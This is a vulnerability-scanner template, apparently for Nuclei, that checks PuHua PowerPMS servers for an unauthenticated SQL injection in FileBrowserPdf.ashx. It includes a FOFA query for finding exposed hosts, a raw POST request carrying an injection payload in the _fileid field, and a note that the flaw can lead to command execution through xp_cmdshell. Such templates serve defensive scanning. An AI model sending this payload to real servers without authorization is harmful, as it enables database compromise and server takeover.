id: PuHua-PowerPMS-FileBrowserPdf-SQL

info:
  name: 普华 PowerPMS FileBrowserPdf.ashx SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: app="普华科技-PowerPMS"
    普华 PowerPMS FileBrowserPdf.ashx 接口处存在SQL注入漏洞,未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
  reference:
    - 
  tags: SQL Injection
  
http:
  - raw:
      - |
        POST /PowerPlat/Control/FileBrowserPdf.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _fileid=1'and db_name()>0 --

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - 'status_code==200 && contains_all(body,"success","false","nvarchar")'
